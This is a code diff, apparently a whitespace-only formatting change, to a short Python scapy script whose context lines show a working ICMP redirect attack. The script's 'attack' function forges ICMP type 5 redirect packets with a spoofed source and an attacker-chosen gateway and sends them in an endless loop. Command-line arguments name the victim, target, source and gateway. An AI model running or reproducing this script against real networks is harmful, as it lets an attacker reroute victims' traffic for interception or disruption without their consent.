@@ -4,6 +4,7 @@
 from scapy.all import *
 from time import sleep
 
+
 def attack(victim, target, source, gateway):
     ip = IP(dst=victim, src=source)
     icmp = ICMP(type=5, code=1, gw=gateway)
@@ -11,6 +12,7 @@ def attack(victim, target, source, gateway):
     while True:
         send(ip/icmp/redirectedip/UDP())
         sleep(1)
+
 
 def main():
     from sys import argv
@@ -26,6 +28,7 @@ def main():
         opt.print_help()
     else:
         attack(args[0].victim, args[0].target, args[0].source, args[0].gateway)
+
 
 if __name__ == '__main__':
     main()
